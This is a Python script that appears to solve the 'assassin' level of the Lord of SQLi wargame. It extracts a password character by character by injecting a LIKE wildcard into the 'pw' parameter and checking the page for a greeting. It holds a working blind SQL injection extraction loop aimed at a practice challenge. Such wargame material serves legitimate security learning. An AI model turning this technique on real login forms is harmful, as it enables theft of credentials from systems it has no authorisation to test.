# LordofSQLi: assassin
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookies = {'PHPSESSID': '7n1n89uq147dkn1dkvm753st6e'}
passwd = ''

while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f'{passwd + c}%'}
        r = requests.get(url, params=payload, cookies=cookies)
        print(c, end='', flush=True)
        if 'Hello admin' in r.text or 'Hello guest' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break

print('\n->' + passwd)
